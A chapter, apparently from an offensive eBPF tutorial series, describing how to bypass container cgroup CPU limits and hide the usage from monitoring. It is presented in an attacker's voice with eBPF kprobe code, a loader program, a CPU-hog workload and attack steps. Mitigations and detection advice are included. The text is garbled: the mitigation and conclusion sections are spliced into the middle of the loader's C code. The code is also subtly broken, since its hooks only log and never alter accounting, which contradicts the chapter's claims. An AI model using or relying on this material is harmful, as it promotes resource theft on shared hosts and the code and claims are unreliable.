# Slipping the Cgroup Leash: Bypassing Resource Constraints

**Chapter 6: Breaking Free from All Constraints**

We're reaching the end of Act I of our story. You've learned to subvert security controls, escape containers, evade monitoring, create phantom syscalls, and establish covert networking. But there's one more constraint holding you back: resource limits.

This is where we complete the foundation of our eBPF mastery. It's not enough to bypass security—you need to bypass the very resource constraints that are supposed to keep your activities contained and limited.

You know that feeling when you're in a container and you hit those annoying resource limits? CPU throttled, memory capped, disk I/O restricted? Well, what if I told you those limits are just suggestions that we can politely ignore?

We're going to slip the cgroup leash—make the kernel think we're being good little containers while we're actually consuming whatever resources we want. It's like having a speedometer that always shows the speed limit while you're actually doing 120 mph.

This completes our basic toolkit. You now have the fundamental skills to operate completely outside the bounds of what security systems think is possible. But this is just the beginning—Act II is where things get really interesting.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Container Process] -->|1. CPU Usage| B[Kernel Scheduler]
    B -->|2. Track Usage| C[Cgroup Accounting]
    D[eBPF Program] -->|3. Intercept| C
    D -->|4. Modify Metrics| E[False Accounting]
    F[Monitoring System] -->|5. Reads| E
    G[Actual CPU Usage] -->|6. Exceeds Limits| H[Resource Theft]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
    style G fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/scheduler/sched-design-CFS.html" "Linux Scheduler Documentation"
    click C "https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v2.html" "Cgroup Documentation"
    click D "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
```



**Why Container Resource Limits Are Broken**

Here's the dirty secret about container security: it's all built on trust. Trust that the kernel will enforce CPU limits. Trust that memory caps will be respected. Trust that I/O throttling will actually throttle.

But what happens when you can whisper in the kernel's ear and convince it to look the other way? What happens when you can make the resource accounting lie?

That's where cgroup manipulation gets scary. Your monitoring tools will show perfect compliance—CPU usage within limits, memory consumption under control, disk I/O behaving nicely. Meanwhile, you're actually consuming whatever resources you want.

The beautiful part is that this doesn't just bypass limits—it makes the bypass invisible. The container orchestrator thinks everything is fine, the monitoring dashboards stay green, and the resource accounting reports exactly what everyone expects to see. It's the perfect crime.

## How We Break the Resource Cage

### Understanding the Cgroup Warden

Cgroups are basically the kernel's resource police. They're supposed to:
- **Set hard limits** on what you can use (CPU, memory, I/O, etc.)
- **Decide who gets priority** when resources are scarce
- **Keep detailed records** of what everyone's using
- **Control the lifecycle** of processes

Container runtimes rely on cgroups to keep containers from hogging all the resources. It's like having a bouncer at the club who counts how many drinks you've had.

But what if we could make the bouncer's counting machine lie?

```
┌─────────────────────────────────────────────────────────────┐
│                      Container Runtime                      │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Container A   │      │ Container B   │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Linux Kernel                           │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Cgroup A      │      │ Cgroup B      │                   │
│  │ CPU: 0.5 cores│      │ CPU: 0.5 cores│                   │
│  │ Mem: 512MB    │      │ Mem: 512MB    │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           CPU Scheduler              │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
│  ┌──────────────────▼───────────────────┐                   │
│  │           Physical Resources         │                   │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

Here's what happens when we slip our eBPF program into the mix:

```
┌─────────────────────────────────────────────────────────────┐
│                      Container Runtime                      │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Container A   │      │ Container B   │                   │
│  │ (Malicious)   │      │               │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Linux Kernel                           │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Cgroup A      │      │ Cgroup B      │                   │
│  │ CPU: 0.5 cores│      │ CPU: 0.5 cores│                   │
│  │ Mem: 512MB    │      │ Mem: 512MB    │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────┐           │                           │
│  │  eBPF Program    │           │                           │
│  └───────┬──────────┘           │                           │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           CPU Scheduler              │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
│  ┌──────────────────▼───────────────────┐                   │
│  │           Physical Resources         │                   │
│  │     Container A: 0.9 cores (actual)  │                   │
│  │     Container A: 0.5 cores (reported)│                   │
│  │     Container B: 0.1 cores (actual)  │                   │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### How We Cook the Books

Here's our game plan for fooling the resource accounting:

1. **Hook the Accountants**: We attach to functions like [`cgroup_account_cputime()`](https://elixir.bootlin.com/linux/latest/source/kernel/sched/cputime.c) that track resource usage
2. **Fudge the Numbers**: Make our actual CPU usage look much smaller than it really is
3. **Dodge the Throttle**: Stop the kernel from slowing us down when we "exceed" our fake quota
4. **Keep Up Appearances**: Make sure all the monitoring dashboards show we're being good

The beauty is that we're not breaking the cgroup system—we're just lying to it about what we're doing.

### Building Our Resource Thief

```c
// @interactive: true
// @copyable: true
// Cgroup Leash Slipping - eBPF exploitation proof of concept
// This demonstrates bypassing CPU resource constraints

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/sched.h>
#include <linux/cgroup.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define USAGE_DIVISOR 10  // Report only 1/10th of actual CPU usage
#define TARGET_CGROUP_ID 0x1234  // Target cgroup ID to manipulate

// Structure to track CPU usage
struct cpu_usage {
    u64 original;  // Original CPU usage
    u64 reported;  // Reported (manipulated) CPU usage
    u64 stolen;    // Amount of CPU time "stolen"
    u64 timestamp; // Last update timestamp
};

// Map to store real vs. reported CPU usage
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(struct cpu_usage));
    __uint(max_entries, 1);
} cpu_usage_map SEC(".maps");

// Map to track cgroups we're manipulating
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u64));  // Cgroup ID
    __uint(value_size, sizeof(u8)); // Flag (1 = target)
    __uint(max_entries, 64);
} target_cgroups SEC(".maps");

// Map to track processes in our target cgroup
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID
    __uint(value_size, sizeof(u8)); // Flag (1 = in target cgroup)
    __uint(max_entries, 1024);
} target_processes SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Structure for logging events
struct log_event {
    u32 pid;
    u64 cgroup_id;
    u64 original_usage;
    u64 reported_usage;
    u64 timestamp;
    char comm[16];
};

// FIXED: Helper function to check if a cgroup is our target
static __always_inline bool is_target_cgroup(struct cgroup *cgrp)
{
    u64 cgroup_id = 0;
    
    // FIXED: Get the cgroup ID safely
    if (cgrp && cgrp->kn) {
        bpf_probe_read_kernel(&cgroup_id, sizeof(cgroup_id), &cgrp->kn->id);
    } else {
        // Fallback: use a hash of the cgroup pointer
        cgroup_id = (u64)cgrp;
    }
    
    // Check if this is one of our target cgroups
    u8 *target = bpf_map_lookup_elem(&target_cgroups, &cgroup_id);
    if (target && *target == 1)
        return true;
    
    // Hardcoded target for demonstration
    if (cgroup_id == TARGET_CGROUP_ID)
        return true;
    
    return false;
}

// Helper function to check if a process is in our target cgroup
static __always_inline bool is_target_process(u32 pid)
{
    // Check if this PID is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_processes, &pid);
    if (target && *target == 1)
        return true;
    
    return false;
}

// Helper function to update CPU usage statistics
static __always_inline void update_cpu_stats(u64 original_usage, u64 reported_usage)
{
    u32 key = 0;
    struct cpu_usage *usage = bpf_map_lookup_elem(&cpu_usage_map, &key);
    
    if (usage) {
        // Update statistics
        usage->original = original_usage;
        usage->reported = reported_usage;
        usage->stolen = original_usage - reported_usage;
        usage->timestamp = bpf_ktime_get_ns();
    } else {
        // Initialize statistics
        struct cpu_usage new_usage = {
            .original = original_usage,
            .reported = reported_usage,
            .stolen = original_usage - reported_usage,
            .timestamp = bpf_ktime_get_ns()
        };
        bpf_map_update_elem(&cpu_usage_map, &key, &new_usage, BPF_ANY);
    }
}

// FIXED: Hook the cgroup CPU accounting function (using a more reliable hook point)
SEC("kprobe/account_group_exec_runtime")
int BPF_KPROBE(hook_cgroup_account, struct task_struct *tsk, u64 runtime)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Get the task's cgroup
    struct cgroup *cgrp = NULL;
    bpf_probe_read_kernel(&cgrp, sizeof(cgrp), &tsk->cgroups);
    
    // Check if this is our target cgroup
    if (cgrp && is_target_cgroup(cgrp)) {
        // Add this process to our tracking map
        u8 value = 1;
        bpf_map_update_elem(&target_processes, &pid, &value, BPF_ANY);
        
        // Calculate the reduced runtime to report
        u64 reduced_runtime = runtime / USAGE_DIVISOR;
        
        // Update our statistics
        update_cpu_stats(runtime, reduced_runtime);
        
        // Log the event
        struct log_event event = {};
        event.pid = pid;
        if (cgrp->kn) {
            bpf_probe_read_kernel(&event.cgroup_id, sizeof(event.cgroup_id), &cgrp->kn->id);
        }
        event.original_usage = runtime;
        event.reported_usage = reduced_runtime;
        event.timestamp = bpf_ktime_get_ns();
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    // Let the original function run
    return 0;
}

// FIXED: Hook the scheduler's task accounting function
SEC("kprobe/update_curr")
int BPF_KPROBE(hook_update_curr, struct cfs_rq *cfs_rq)
{
    // Get the current task
    struct sched_entity *curr = NULL;
    bpf_probe_read_kernel(&curr, sizeof(curr), &cfs_rq->curr);
    
    if (!curr)
        return 0;
    
    // Get the task_struct from sched_entity
    struct task_struct *task = container_of(curr, struct task_struct, se);
    
    // Get process information
    u32 pid = 0;
    bpf_probe_read_kernel(&pid, sizeof(pid), &task->pid);
    
    // Check if this is a process in our target cgroup
    if (is_target_process(pid)) {
        // Get the current runtime
        u64 runtime = 0;
        bpf_probe_read_kernel(&runtime, sizeof(runtime), &curr->sum_exec_runtime);
        
        // Calculate the reduced runtime to report
        u64 reduced_runtime = runtime / USAGE_DIVISOR;
        
        // Update our statistics
        update_cpu_stats(runtime, reduced_runtime);
        
        // Log the event
        struct log_event event = {};
        event.pid = pid;
        event.original_usage = runtime;
        event.reported_usage = reduced_runtime;
        event.timestamp = bpf_ktime_get_ns();
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    // Let the original function run
    return 0;
}

// FIXED: Hook the cgroup throttling function (using a more reliable hook point)
SEC("kprobe/throttle_cfs_rq")
int BPF_KPROBE(hook_throttle, struct cfs_rq *cfs_rq)
{
    // Get the task group from cfs_rq
    struct task_group *tg = NULL;
    bpf_probe_read_kernel(&tg, sizeof(tg), &cfs_rq->tg);
    
    if (!tg)
        return 0;
    
    // Get the cgroup from task group
    struct cgroup *cgrp = NULL;
    bpf_probe_read_kernel(&cgrp, sizeof(cgrp), &tg->css.cgroup);
    
    // Check if this is our target cgroup
    if (cgrp && is_target_cgroup(cgrp)) {
        // Get process information
        u32 pid = bpf_get_current_pid_tgid() >> 32;
        
        // Log the throttling attempt
        struct log_event event = {};
        event.pid = pid;
        if (cgrp->kn) {
            bpf_probe_read_kernel(&event.cgroup_id, sizeof(event.cgroup_id), &cgrp->kn->id);
        }
        event.timestamp = bpf_ktime_get_ns();
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // Note: We can't prevent throttling by returning early in kprobe
        // A real exploit would need to use different techniques
    }
    
    // Let the original function run
    return 0;
}

// Hook the scheduler tick function to manipulate runtime accounting
SEC("kprobe/update_curr")
int BPF_KPROBE(hook_scheduler_tick, struct rq *rq)
{
    // Get the current task
    struct task_struct *curr;
    bpf_probe_read_kernel(&curr, sizeof(curr), &rq->curr);
    
    // Get process information
    u32 pid;
    bpf_probe_read_kernel(&pid, sizeof(pid), &curr->pid);
    
    // Check if this is a process in our target cgroup
    if (is_target_process(pid)) {
        // In a real exploit, we would modify the runtime accounting here
        // This is a simplified version for demonstration
        
        // Get the current runtime
        u64 delta_exec;
        bpf_probe_read_kernel(&delta_exec, sizeof(delta_exec), &curr->se.sum_exec_runtime);
        
        // Calculate the reduced delta to report
        u64 reduced_delta = delta_exec / USAGE_DIVISOR;
        
        // Update our statistics
        update_cpu_stats(delta_exec, reduced_delta);
    }
    
    // Let the original function run
    return 0;
}
```

### The Control Program That Orchestrates Our Theft

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the Cgroup Leash Slipping eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "cgroup_leash.skel.h"

static volatile bool exiting = false;

// Structure for CPU usage (must match the BPF version)
struct cpu_usage {
    uint64_t original;
    uint64_t reported;
    uint64_t stolen;
    uint64_t timestamp;
};

// Structure for log events (must match the BPF version)
struct log_event {
    uint32_t pid;
    uint64_t cgroup_id;
    uint64_t original_usage;
    uint64_t reported_usage;
    uint64_t timestamp;
    char comm[16];
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct log_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Process %d (%s) in cgroup %llu\n", 
           timestamp, e->pid, e->comm, e->cgroup_id);
    printf("  Original CPU usage: %lu ns\n", e->original_usage);
    printf("  Reported CPU usage: %lu ns\n", e->reported_usage);
    printf("  Stolen CPU time: %lu ns\n", e->original_usage - e->reported_usage);
    printf("  Reduction factor: %.2fx\n", 
           (double)e->original_usage / (e->reported_usage ? e->reported_usage : 1));
    printf("\n");
}

static void sig_handler(int sig)
{
    exiting = true;
}

// Add a cgroup to be manipulated
### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Use Host-Level Monitoring**:
   ```bash
   # Monitor CPU usage at the host level
   top -b -n 1 | grep -v "top -"
   
   # Use hardware performance counters
   perf stat -a sleep 10
   
   # Monitor thermal metrics
   sensors | grep "Core"
   ```

4. **Implement Independent Resource Monitoring**:
   ```bash
   # Example script to compare cgroup vs. actual CPU usage
   #!/bin/bash
   
   CONTAINER_ID=$1
   
   # Get cgroup CPU usage
   CGROUP_USAGE=$(cat /sys/fs/cgroup/cpu/docker/$CONTAINER_ID/cpuacct.usage)
   
   # Get actual CPU usage using perf
   PERF_USAGE=$(perf stat -e cycles -p $(pgrep -P $(cat /sys/fs/cgroup/cpu/docker/$CONTAINER_ID/tasks)) 2>&1 | grep cycles | awk '{print $1}')
   
   # Compare and alert on discrepancies
   RATIO=$(echo "scale=2; $PERF_USAGE / $CGROUP_USAGE" | bc)
   if (( $(echo "$RATIO > 1.5" | bc -l) )); then
     echo "ALERT: Container $CONTAINER_ID using $RATIO times more CPU than reported!"
   fi
   ```

### Real-world Impact

In cloud and containerized environments, this technique could allow an attacker to:
- Run crypto miners or other CPU-intensive workloads while appearing idle
- Cause denial of service to neighboring containers or workloads
- Evade billing systems based on resource usage
- Bypass fair-share scheduling in multi-tenant environments
- Potentially trigger thermal throttling or other hardware-level issues

The ability to manipulate resource accounting undermines the fundamental isolation guarantees that container orchestration systems like Kubernetes provide, making this a particularly concerning attack vector in shared computing environments.

**Attacker hat on**

1. Identify a target system with eBPF capabilities and cgroup restrictions
2. Map the kernel functions responsible for cgroup CPU accounting
3. Develop an eBPF program that hooks into these accounting functions
4. Load the malicious BPF program with appropriate privileges
5. Modify CPU usage metrics to report lower utilization
6. Run CPU-intensive workloads that exceed allocated quotas
7. Monitor system dashboards to confirm they show compliance

**Defender hat on**

1. Remove CAP_BPF from container environments
2. Implement BPF LSM policies to restrict eBPF program loading
3. Use host-level monitoring that can't be manipulated from containers
4. Implement physical resource monitoring independent of cgroup metrics
5. Monitor for discrepancies between reported and observed resource usage
6. Consider using eBPF-based security tools that can detect malicious eBPF usage

**Conclusion**

`eBPF is all you need`. The ability to intercept and modify resource accounting through eBPF provides attackers with powerful primitives to subvert container resource limits. This technique highlights the importance of treating eBPF capabilities as privileged operations that should be tightly controlled, especially in multi-tenant environments where resource isolation is critical.
static int add_target_cgroup(int map_fd, uint64_t cgroup_id)
{
    uint8_t value = 1;
    return bpf_map_update_elem(map_fd, &cgroup_id, &value, BPF_ANY);
}

// Print current CPU usage statistics
static void print_cpu_stats(int map_fd)
{
    struct cpu_usage usage;
    uint32_t key = 0;
    
    if (bpf_map_lookup_elem(map_fd, &key, &usage) == 0) {
        printf("CPU Usage Statistics:\n");
        printf("  Original: %lu ns\n", usage.original);
        printf("  Reported: %lu ns\n", usage.reported);
        printf("  Stolen: %lu ns\n", usage.stolen);
        printf("  Reduction factor: %.2fx\n", 
               (double)usage.original / (usage.reported ? usage.reported : 1));
        printf("\n");
    }
}

int main(int argc, char **argv)
{
    struct cgroup_leash_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err;

    // Check command line arguments
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <cgroup_id>\n", argv[0]);
        return 1;
    }

    // Parse cgroup ID
    uint64_t cgroup_id = strtoull(argv[1], NULL, 16);
    if (cgroup_id == 0) {
        fprintf(stderr, "Invalid cgroup ID: %s\n", argv[1]);
        return 1;
    }

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = cgroup_leash_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = cgroup_leash_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Add target cgroup
    err = add_target_cgroup(bpf_map__fd(skel->maps.target_cgroups), cgroup_id);
    if (err) {
        fprintf(stderr, "Failed to add target cgroup: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer: %d\n", err);
        goto cleanup;
    }

    printf("Cgroup Leash Slipping eBPF program successfully loaded and attached!\n");
    printf("Manipulating CPU accounting for cgroup ID: 0x%lx\n", cgroup_id);
    printf("Press Ctrl+C to exit\n\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
        
        // Print current CPU usage statistics every second
        static time_t last_print = 0;
        time_t now = time(NULL);
        if (now - last_print >= 1) {
            print_cpu_stats(bpf_map__fd(skel->maps.cpu_usage_map));
            last_print = now;
        }
    }

cleanup:
    perf_buffer__free(pb);
    cgroup_leash_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### The CPU Hog That Proves Our Point

```c
// @interactive: true
// @copyable: true
// CPU-intensive workload generator to demonstrate the attack

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

#define NUM_THREADS 4  // Number of CPU-intensive threads to spawn

static volatile int running = 1;

// Function to consume CPU cycles
void *cpu_intensive_task(void *arg)
{
    unsigned long long i = 0;
    double result = 0.0;
    
    printf("Thread %ld started\n", (long)arg);
    
    while (running) {
        // Perform meaningless calculations to consume CPU
        result += (double)i / (i + 1);
        i++;
        
        // Prevent compiler optimization
        if (i % 10000000 == 0) {
            printf("Thread %ld: iteration %llu, result: %f\n", 
                   (long)arg, i, result);
        }
    }
    
    printf("Thread %ld exiting\n", (long)arg);
    return NULL;
}

void handle_signal(int sig)
{
    printf("Caught signal %d, shutting down...\n", sig);
    running = 0;
}

int main(int argc, char *argv[])
{
    pthread_t threads[NUM_THREADS];
    int i;
    
    // Set up signal handler
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    printf("Starting CPU-intensive workload with %d threads\n", NUM_THREADS);
    
    // Create threads
    for (i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, cpu_intensive_task, (void *)(long)i) != 0) {
            perror("Failed to create thread");
            exit(1);
        }
    }
    
    // Wait for threads to complete
    for (i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("All threads completed\n");
    return 0;
}
```

### How They'll Try to Catch Us

Smart defenders will be looking for the telltale signs of our resource theft:

1. **eBPF Program Surveillance**:
   - They'll watch for eBPF programs hooking cgroup or scheduler functions
   - Monitor what eBPF programs are loading and who's signing them
   - Use [`bpftool`](https://github.com/libbpf/bpftool) to see what's running in the kernel

2. **Cross-Reference Reality**:
   - Set up host-level monitoring that we can't touch from inside containers
   - Compare what cgroups report vs. what the hardware actually shows
   - Use performance counters that bypass our accounting manipulation

3. **Spot the Lies**:
   - Look for containers that report low CPU but somehow slow down the whole system
   - Watch for patterns where the math doesn't add up
   - Notice when other workloads get slower despite "compliant" neighbors

4. **Red Flags They'll Watch For**:
   - System metrics that don't match container metrics
   - Containers that look idle but make the fans spin up
   - Thermal throttling when the dashboards show everything's fine

## POC

Companion code: [`ch05-cgroup-leash`]({{ site.baseurl }}/dBPF-pocs/pocs/ch05-cgroup-leash/)
